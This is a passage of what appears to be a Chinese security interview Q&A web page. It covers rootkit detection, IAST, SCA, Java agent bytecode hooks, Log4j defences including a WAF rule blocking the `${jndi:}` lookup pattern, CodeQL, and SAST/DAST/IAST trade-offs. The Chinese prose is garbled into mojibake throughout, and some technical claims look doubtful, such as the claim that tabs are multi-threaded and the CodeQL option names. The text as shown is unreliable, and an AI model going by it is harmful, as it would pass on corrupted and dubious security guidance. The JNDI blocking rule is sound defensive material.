title="è¿›ç¨‹éšè—æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•æ£€æµ‹ï¼Ÿ"></a>è¿›ç¨‹éšè—æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•æ£€æµ‹ï¼Ÿ</h3><ol><li><p><strong>è¿›ç¨‹éšè—æŠ€æœ¯</strong>ï¼š</p><ul><li>é€šè¿‡ä¿®æ”¹å†…æ ¸æˆ–ä½¿ç”¨ rootkit éšè—è¿›ç¨‹ã€‚</li></ul></li><li><p><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ul><li>ä½¿ç”¨ <code>chkrootkit</code> æˆ– <code>rkhunter</code> æ£€æµ‹ rootkitã€‚</li><li>æ¯”è¾ƒ <code>ps</code> å’Œ <code>top</code> çš„è¾“å‡ºï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ä¸ä¸€è‡´çš„è¿›ç¨‹ã€‚</li></ul></li></ol><h3 id="èŠèŠ-IAST"><a href="#èŠèŠ-IAST" class="headerlink" title="èŠèŠ IAST"></a>èŠèŠ IAST</h3><ul><li><strong>IASTï¼ˆInteractive Application Security Testingï¼‰</strong>ï¼š<ul><li>é€šè¿‡åŠ¨æ€åˆ†æå’Œé™æ€åˆ†æç›¸ç»“åˆçš„æ–¹å¼ï¼Œæ£€æµ‹åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´ã€‚</li><li><strong>å·¥å…·</strong>ï¼šAcunetixã€Contrast Securityã€‚</li></ul></li></ul><h3 id="å¦‚æœå¤šè¿›ç¨‹ä¸‹ï¼ŒA-è¿›ç¨‹çš„-Source-è§¦å‘åˆ°äº†-B-è¿›ç¨‹çš„-Sink-ç‚¹ï¼Œå¦‚ä½•æº¯æºï¼Ÿ"><a href="#å¦‚æœå¤šè¿›ç¨‹ä¸‹ï¼ŒA-è¿›ç¨‹çš„-Source-è§¦å‘åˆ°äº†-B-è¿›ç¨‹çš„-Sink-ç‚¹ï¼Œå¦‚ä½•æº¯æºï¼Ÿ" class="headerlink" title="å¦‚æœå¤šè¿›ç¨‹ä¸‹ï¼ŒA è¿›ç¨‹çš„ Source è§¦å‘åˆ°äº† B è¿›ç¨‹çš„ Sink ç‚¹ï¼Œå¦‚ä½•æº¯æºï¼Ÿ"></a>å¦‚æœå¤šè¿›ç¨‹ä¸‹ï¼ŒA è¿›ç¨‹çš„ Source è§¦å‘åˆ°äº† B è¿›ç¨‹çš„ Sink ç‚¹ï¼Œå¦‚ä½•æº¯æºï¼Ÿ</h3><ol><li><p><strong>æ—¥å¿—åˆ†æ</strong>ï¼š</p><ul><li>æ£€æŸ¥ A è¿›ç¨‹å’Œ B è¿›ç¨‹çš„æ—¥å¿—ï¼Œå¯»æ‰¾ç›¸å…³çš„è°ƒç”¨é“¾ã€‚</li></ul></li><li><p><strong>ä»£ç å®¡æŸ¥</strong>ï¼š</p><ul><li>å®¡æŸ¥ä»£ç ï¼Œæ‰¾åˆ° A è¿›ç¨‹çš„ Source å’Œ B è¿›ç¨‹çš„ Sink ç‚¹ä¹‹é—´çš„è°ƒç”¨å…³ç³»ã€‚</li></ul></li><li><p><strong>ä½¿ç”¨è°ƒè¯•å·¥å…·</strong>ï¼š</p><ul><li>ä½¿ç”¨è°ƒè¯•å·¥å…·ï¼ˆå¦‚ GDBï¼‰è·Ÿè¸ªè¿›ç¨‹é—´çš„é€šä¿¡ã€‚</li></ul></li></ol><h3 id="SCAæ˜¯ä»€ä¹ˆä»¥åŠå¦‚ä½•å®ç°"><a href="#SCAæ˜¯ä»€ä¹ˆä»¥åŠå¦‚ä½•å®ç°" class="headerlink" title="SCAæ˜¯ä»€ä¹ˆä»¥åŠå¦‚ä½•å®ç°"></a>SCAæ˜¯ä»€ä¹ˆä»¥åŠå¦‚ä½•å®ç°</h3><p><strong>SCAï¼ˆSoftware Composition Analysisï¼‰</strong> æ˜¯ä¸€ç§ç”¨äºè¯†åˆ«å’Œåˆ†æåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„å¼€æºç»„ä»¶çš„æŠ€æœ¯ã€‚å®ƒå¯ä»¥å¸®åŠ©ç»„ç»‡äº†è§£å…¶è½¯ä»¶ä¾›åº”é“¾ä¸­çš„å®‰å…¨æ¼æ´ã€è®¸å¯è¯åˆè§„æ€§é—®é¢˜ä»¥åŠä»£ç è´¨é‡ã€‚SCAå·¥å…·é€šå¸¸é€šè¿‡æ‰«æä»£ç åº“ã€å®¹å™¨å’Œç›¸å…³éƒ¨åˆ†æ¥è‡ªåŠ¨è¯†åˆ«æ‰€æœ‰å¼€æºç»„ä»¶ã€è®¸å¯è¯ä¿¡æ¯ä»¥åŠå®‰å…¨æ¼æ´ã€‚</p><h4 id="SCAçš„å®ç°æ–¹å¼"><a href="#SCAçš„å®ç°æ–¹å¼" class="headerlink" title="SCAçš„å®ç°æ–¹å¼"></a><strong>SCAçš„å®ç°æ–¹å¼</strong></h4><ol><li><p><strong>ç°ç›’æµ‹è¯•å®ç°</strong>ï¼š</p><ul><li><strong>ä¾èµ–åˆ†æ</strong>ï¼šé€šè¿‡åˆ†æåº”ç”¨ç¨‹åºçš„ä¾èµ–å…³ç³»å›¾æ¥è¯†åˆ«æ‰€æœ‰ç›´æ¥å’Œé—´æ¥ä¾èµ–çš„å¼€æºç»„ä»¶ã€‚</li><li><strong>è¿è¡Œæ—¶ç›‘æ§</strong>ï¼šåˆ©ç”¨agentæŠ€æœ¯ï¼Œåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ç›‘æ§å…¶è¡Œä¸ºï¼Œè¯†åˆ«ä½¿ç”¨çš„ç»„ä»¶å’Œæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚</li><li><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨agentç›‘æ§åº”ç”¨ç¨‹åºçš„ä¾èµ–</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DependencyMonitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿagentç›‘æ§é€»è¾‘</span></span><br><span class="line">        List&lt;String&gt; dependencies = scanDependencies();</span><br><span class="line">        <span class="keyword">for</span> (String dep : dependencies) &#123;</span><br><span class="line">            checkVulnerabilities(dep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">scanDependencies</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿæ‰«æä¾èµ–</span></span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(<span class="string">&quot;spring-core:5.3.10&quot;</span>, <span class="string">&quot;log4j:2.17.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkVulnerabilities</span><span class="params">(String dependency)</span> &#123;</span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿæ£€æŸ¥æ¼æ´</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Checking vulnerabilities for: &quot;</span> + dependency);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ç™½ç›’æµ‹è¯•å®ç°</strong>ï¼š</p><ul><li><strong>é™æ€åˆ†æ</strong>ï¼šé€šè¿‡åˆ†ææºä»£ç æˆ–æ„å»ºé…ç½®æ–‡ä»¶ï¼ˆå¦‚<code>pom.xml</code>ã€<code>build.gradle</code>ï¼‰æ¥è¯†åˆ«ä¾èµ–å…³ç³»ã€‚</li><li><strong>ç»“åˆMavenæ’ä»¶</strong>ï¼šä½¿ç”¨Mavenæ’ä»¶å¯ä»¥æ›´é«˜æ•ˆåœ°åˆ†æé¡¹ç›®çš„ä¾èµ–å…³ç³»ï¼Œå¹¶ç”Ÿæˆè¯¦ç»†çš„æŠ¥å‘Šã€‚</li><li><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Mavenæ’ä»¶ç¤ºä¾‹ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="å¦‚ä½•æ¢æµ‹æ˜¯å¦å­˜åœ¨æŸä¸ªç±»ï¼ˆjaråŒ…ï¼‰"><a href="#å¦‚ä½•æ¢æµ‹æ˜¯å¦å­˜åœ¨æŸä¸ªç±»ï¼ˆjaråŒ…ï¼‰" class="headerlink" title="å¦‚ä½•æ¢æµ‹æ˜¯å¦å­˜åœ¨æŸä¸ªç±»ï¼ˆjaråŒ…ï¼‰"></a>å¦‚ä½•æ¢æµ‹æ˜¯å¦å­˜åœ¨æŸä¸ªç±»ï¼ˆjaråŒ…ï¼‰</h3><ol><li><p><strong>æ‰«æç±»è·¯å¾„</strong>ï¼šé€šè¿‡æ‰«æç±»è·¯å¾„æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ç‰¹å®šçš„ç±»æˆ–jaråŒ…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassDetector</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">detectClass</span><span class="params">(String className)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(className);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> detectClass(<span class="string">&quot;org.apache.log4j.Logger&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Log4j exists: &quot;</span> + exists);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>ä¾èµ–ç®¡ç†å·¥å…·</strong>ï¼šä½¿ç”¨å¦‚Mavenã€Gradleç­‰å·¥å…·æ¥åˆ—å‡ºæ‰€æœ‰ä¾èµ–é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mavenå‘½ä»¤</span></span><br><span class="line">mvn dependency:tree</span><br></pre></td></tr></table></figure></li><li><p><strong>ååºåˆ—åŒ–ç‚¸å¼¹æ£€æµ‹</strong>ï¼š</p><ul><li><strong>å¼‚å¸¸æ£€æµ‹</strong>ï¼šç›‘æ§ååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„å¼‚å¸¸è¡Œä¸ºã€‚</li><li><strong>æ•°æ®æµåˆ†æ</strong>ï¼šåˆ†æååºåˆ—åŒ–æ•°æ®çš„æ¥æºå’Œæµå‘ï¼Œè¯†åˆ«æ½œåœ¨çš„é£é™©ã€‚</li><li><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationDetector</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;suspected.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="comment">// æ£€æµ‹ååºåˆ—åŒ–åçš„å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> SuspiciousClass) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Detected deserialization bomb!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="æµè§ˆå™¨å¤šçª—å£å’Œå¤šæ ‡ç­¾çš„è®¾è®¡"><a href="#æµè§ˆå™¨å¤šçª—å£å’Œå¤šæ ‡ç­¾çš„è®¾è®¡" class="headerlink" title="æµè§ˆå™¨å¤šçª—å£å’Œå¤šæ ‡ç­¾çš„è®¾è®¡"></a>æµè§ˆå™¨å¤šçª—å£å’Œå¤šæ ‡ç­¾çš„è®¾è®¡</h3><ul><li><strong>å¤šçª—å£</strong>ï¼šé€šå¸¸å±äºå¤šè¿›ç¨‹è®¾è®¡ï¼Œæ¯ä¸ªçª—å£è¿è¡Œåœ¨ç‹¬ç«‹çš„è¿›ç¨‹ä¸­ï¼Œä»¥æé«˜ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚</li><li><strong>å¤šæ ‡ç­¾</strong>ï¼šé€šå¸¸å±äºå¤šçº¿ç¨‹è®¾è®¡ï¼ŒåŒä¸€çª—å£å†…çš„å¤šä¸ªæ ‡ç­¾å…±äº«ä¸€ä¸ªè¿›ç¨‹ï¼Œä½†é€šè¿‡ç‹¬ç«‹çš„çº¿ç¨‹æ¥éš”ç¦»ä¸åŒçš„ç½‘é¡µå†…å®¹ã€‚</li><li><strong>è®¾è®¡åŸå› </strong>ï¼š<ul><li><strong>æ€§èƒ½</strong>ï¼šå¤šè¿›ç¨‹è®¾è®¡å¯ä»¥é˜²æ­¢ä¸€ä¸ªçª—å£å´©æºƒå½±å“å…¶ä»–çª—å£ã€‚</li><li><strong>èµ„æºéš”ç¦»</strong>ï¼šå¤šçº¿ç¨‹è®¾è®¡å¯ä»¥åœ¨åŒä¸€çª—å£å†…é«˜æ•ˆåœ°ç®¡ç†å¤šä¸ªæ ‡ç­¾ï¼Œå‡å°‘å†…å­˜å ç”¨ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šéš”ç¦»ä¸åŒçš„ç½‘é¡µå†…å®¹ï¼Œé˜²æ­¢è·¨æ ‡ç­¾æ”»å‡»ã€‚</li></ul></li></ul><h3 id="ä»agentåˆ°å­—èŠ‚ç hookçš„æ•´ä¸ªæµç¨‹ï¼ˆä¼ªä»£ç ï¼‰"><a href="#ä»agentåˆ°å­—èŠ‚ç hookçš„æ•´ä¸ªæµç¨‹ï¼ˆä¼ªä»£ç ï¼‰" class="headerlink" title="ä»agentåˆ°å­—èŠ‚ç hookçš„æ•´ä¸ªæµç¨‹ï¼ˆä¼ªä»£ç ï¼‰"></a>ä»agentåˆ°å­—èŠ‚ç hookçš„æ•´ä¸ªæµç¨‹ï¼ˆä¼ªä»£ç ï¼‰</h3><ol><li><strong>æ³¨å†ŒJVMåˆå§‹åŒ–äº‹ä»¶</strong>ï¼šåœ¨JVMå¯åŠ¨æ—¶ï¼Œé€šè¿‡<code>Agent_OnLoad</code>å‡½æ•°æ³¨å†Œåˆå§‹åŒ–äº‹ä»¶ç›‘å¬å™¨ã€‚</li><li><strong>åˆå§‹åŒ–å®Œæˆåæ³¨å†Œç±»è½¬æ¢å™¨</strong>ï¼šåœ¨JVMåˆå§‹åŒ–å®Œæˆåï¼Œæ³¨å†Œä¸€ä¸ª<code>ClassFileTransformer</code>ï¼Œç”¨äºåœ¨ç±»åŠ è½½æ—¶ä¿®æ”¹å­—èŠ‚ç ã€‚</li><li><strong>ä¿®æ”¹å­—èŠ‚ç </strong>ï¼šåœ¨<code>transform</code>æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ASMç­‰å­—èŠ‚ç æ“ä½œåº“å¯¹ç›®æ ‡ç±»çš„å­—èŠ‚ç è¿›è¡Œä¿®æ”¹ï¼Œæ’å…¥ç›‘æ§æˆ–å®‰å…¨æ£€æŸ¥ä»£ç ã€‚</li><li><strong>è¿”å›ä¿®æ”¹åçš„å­—èŠ‚ç </strong>ï¼šå°†ä¿®æ”¹åçš„å­—èŠ‚ç è¿”å›ç»™JVMï¼ŒJVMä¼šä½¿ç”¨è¿™ä¸ªä¿®æ”¹åçš„å­—èŠ‚ç æ¥åˆ›å»ºç±»çš„å®ä¾‹ã€‚</li></ol><p>ä¼ªä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">ClassFileTransformer</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                                    Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                                    <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">                <span class="comment">// ä½¿ç”¨ASMç­‰åº“ä¿®æ”¹å­—èŠ‚ç </span></span><br><span class="line">                <span class="keyword">return</span> modifyClassFile(className, classfileBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] modifyClassFile(String className, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ASMç­‰åº“è¿›è¡Œå­—èŠ‚ç ä¿®æ”¹çš„é€»è¾‘</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">return</span> modifiedClassfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="log4jæœ‰å“ªäº›é˜²å¾¡æ–¹æ³•æŠ€æœ¯å±‚é¢"><a href="#log4jæœ‰å“ªäº›é˜²å¾¡æ–¹æ³•æŠ€æœ¯å±‚é¢" class="headerlink" title="log4jæœ‰å“ªäº›é˜²å¾¡æ–¹æ³•æŠ€æœ¯å±‚é¢"></a>log4jæœ‰å“ªäº›é˜²å¾¡æ–¹æ³•æŠ€æœ¯å±‚é¢</h3><ol><li><strong>å‡çº§Log4jç‰ˆæœ¬</strong>ï¼šå‡çº§åˆ°Log4j 2.17.1æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œè¿™äº›ç‰ˆæœ¬ä¿®å¤äº†å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li><li><strong>ç¦ç”¨JNDIåŠŸèƒ½</strong>ï¼šé€šè¿‡è®¾ç½®ç³»ç»Ÿå±æ€§<code>log4j2.formatMsgNoLookups=true</code>æ¥ç¦ç”¨JNDIåŠŸèƒ½ï¼Œé˜²æ­¢è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li><li><strong>ç§»é™¤JNDIæ”¯æŒæ¨¡å—</strong>ï¼šä»Log4jçš„JARæ–‡ä»¶ä¸­ç§»é™¤JNDIç›¸å…³çš„ç±»æ–‡ä»¶ï¼Œå¦‚<code>JndiManager.class</code>ã€‚</li><li><strong>ä½¿ç”¨WAFè¿›è¡Œé˜²æŠ¤</strong>ï¼šåœ¨Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰ä¸­é…ç½®è§„åˆ™ï¼Œæ‹¦æˆªåŒ…å«<code>$&#123;jndi:&#125;</code>æ¨¡å¼çš„è¯·æ±‚ã€‚</li><li><strong>ç›‘æ§å’Œæ—¥å¿—åˆ†æ</strong>ï¼šå®æ—¶ç›‘æ§åº”ç”¨æ—¥å¿—ï¼ŒåŠæ—¶å‘ç°å’Œå“åº”æ½œåœ¨çš„æ”»å‡»è¡Œä¸ºã€‚</li></ol><h3 id="è°ˆä¸€ä¸‹CodeQLï¼Œèƒ½ä¸èƒ½ç”¨æ¥åšCI-CD"><a href="#è°ˆä¸€ä¸‹CodeQLï¼Œèƒ½ä¸èƒ½ç”¨æ¥åšCI-CD" class="headerlink" title="è°ˆä¸€ä¸‹CodeQLï¼Œèƒ½ä¸èƒ½ç”¨æ¥åšCI&#x2F;CD"></a>è°ˆä¸€ä¸‹CodeQLï¼Œèƒ½ä¸èƒ½ç”¨æ¥åšCI&#x2F;CD</h3><p>CodeQLæ˜¯ä¸€ç§å¼ºå¤§çš„ä»£ç åˆ†æå·¥å…·ï¼Œå¯ä»¥ç”¨äºCI&#x2F;CDæµç¨‹ä¸­ã€‚å®ƒèƒ½å¤Ÿé™æ€åˆ†æä»£ç ï¼Œæ£€æµ‹æ½œåœ¨çš„å®‰å…¨æ¼æ´å’Œä»£ç è´¨é‡é—®é¢˜ã€‚åœ¨CI&#x2F;CDä¸­ï¼Œå¯ä»¥å°†CodeQLé›†æˆåˆ°æ„å»ºæµç¨‹ä¸­ï¼Œè‡ªåŠ¨è¿è¡Œåˆ†æä»»åŠ¡ï¼Œå¹¶åœ¨å‘ç°é—®é¢˜æ—¶è§¦å‘è­¦æŠ¥æˆ–é˜»æ­¢æ„å»ºé€šè¿‡ã€‚è¿™æ ·å¯ä»¥åœ¨æ—©æœŸé˜¶æ®µå‘ç°å’Œä¿®å¤é—®é¢˜ï¼Œæé«˜ä»£ç è´¨é‡ã€‚</p><h3 id="CodeQLå“ªäº›åœ°æ–¹ä¼šæ–­ï¼Œè¯¥æ€ä¹ˆå¤„ç†"><a href="#CodeQLå“ªäº›åœ°æ–¹ä¼šæ–­ï¼Œè¯¥æ€ä¹ˆå¤„ç†" class="headerlink" title="CodeQLå“ªäº›åœ°æ–¹ä¼šæ–­ï¼Œè¯¥æ€ä¹ˆå¤„ç†"></a>CodeQLå“ªäº›åœ°æ–¹ä¼šæ–­ï¼Œè¯¥æ€ä¹ˆå¤„ç†</h3><ol><li><strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼šå½“åˆ†æçš„è·¯å¾„è¿‡å¤šæ—¶ï¼Œå¯èƒ½å¯¼è‡´åˆ†ææ€§èƒ½ä¸‹é™ã€‚å¯ä»¥é€šè¿‡è®¾ç½®<code>--max-paths</code>å‚æ•°æ¥é™åˆ¶åˆ†æçš„è·¯å¾„æ•°é‡ã€‚</li><li><strong>å†…å­˜æº¢å‡º</strong>ï¼šåˆ†æå¤§å‹ä»£ç åº“æ—¶å¯èƒ½ä¼šå‡ºç°å†…å­˜ä¸è¶³çš„æƒ…å†µã€‚å¯ä»¥å¢åŠ åˆ†é…ç»™CodeQLçš„å†…å­˜ï¼Œæˆ–è€…ä¼˜åŒ–æŸ¥è¯¢ä»¥å‡å°‘å†…å­˜ä½¿ç”¨ã€‚</li><li><strong>è¯¯æŠ¥</strong>ï¼šCodeQLå¯èƒ½ä¼šæŠ¥å‘Šä¸€äº›è¯¯æŠ¥ã€‚å¯ä»¥é€šè¿‡è‡ªå®šä¹‰æŸ¥è¯¢æˆ–ä½¿ç”¨<code>@suppress</code>æ³¨é‡Šæ¥æ ‡è®°å’Œè¿‡æ»¤è¯¯æŠ¥ã€‚</li></ol><h3 id="è¯´ä¸€ä¸‹SASTã€DASTã€IASTçš„ä¼˜ç¼ºç‚¹"><a href="#è¯´ä¸€ä¸‹SASTã€DASTã€IASTçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="è¯´ä¸€ä¸‹SASTã€DASTã€IASTçš„ä¼˜ç¼ºç‚¹"></a>è¯´ä¸€ä¸‹SASTã€DASTã€IASTçš„ä¼˜ç¼ºç‚¹</h3><table><thead><tr><th>å·¥å…·ç±»å‹</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>SASTï¼ˆé™æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼‰</td><td>1. æ— éœ€è¿è¡Œåº”ç”¨ï¼Œå¯åœ¨ç¼–ç é˜¶æ®µæ—©æœŸå‘ç°æ¼æ´ã€‚2. å¯ä»¥æ£€æµ‹åˆ°ä»£ç ä¸­çš„æ½œåœ¨é€»è¾‘æ¼æ´ã€‚3. æœ‰åŠ©äºæé«˜ä»£ç è´¨é‡ã€‚</td><td>1. éœ€è¦è®¿é—®æºä»£ç ã€‚2. å¯èƒ½äº§ç”Ÿè¾ƒå¤šè¯¯æŠ¥ã€‚3. éƒ¨ç½²æˆæœ¬è¾ƒé«˜ã€‚</td></tr><tr><td>DASTï¼ˆåŠ¨æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼‰</td><td>1. ä¸éœ€è¦æºä»£ç ï¼Œå¯åœ¨è¿è¡Œæ—¶æ£€æµ‹å®é™…æ¼æ´ã€‚2. èƒ½å¤Ÿå‘ç°è¿è¡Œæ—¶ç‰¹å®šçš„æ¼æ´ã€‚3. éƒ¨ç½²ç›¸å¯¹ç®€å•ã€‚</td><td>1. æ— æ³•æ£€æµ‹åˆ°ä»£ç ä¸­çš„é€»è¾‘æ¼æ´ã€‚2. å¯èƒ½é”™è¿‡æœªè¢«æµ‹è¯•åˆ°çš„æ”»å‡»é¢ã€‚3. è¯¯æŠ¥ç‡ç›¸å¯¹è¾ƒé«˜ã€‚</td></tr><tr><td>IASTï¼ˆäº¤äº’å¼åº”ç”¨å®‰å…¨æµ‹è¯•ï¼‰</td><td>1. ç»“åˆäº†SASTå’ŒDASTçš„ä¼˜ç‚¹ï¼Œå¯åœ¨è¿è¡Œæ—¶æ£€æµ‹å¹¶å…³è”ä»£ç ä¸­çš„æ¼æ´ã€‚2. èƒ½å¤Ÿæä¾›æ›´å‡†ç¡®çš„æ¼æ´å®šä½å’Œä¿®å¤å»ºè®®ã€‚3. é€‚åˆå¤æ‚åº”ç”¨çš„å®‰å…¨æµ‹è¯•ã€‚</td><td>1. 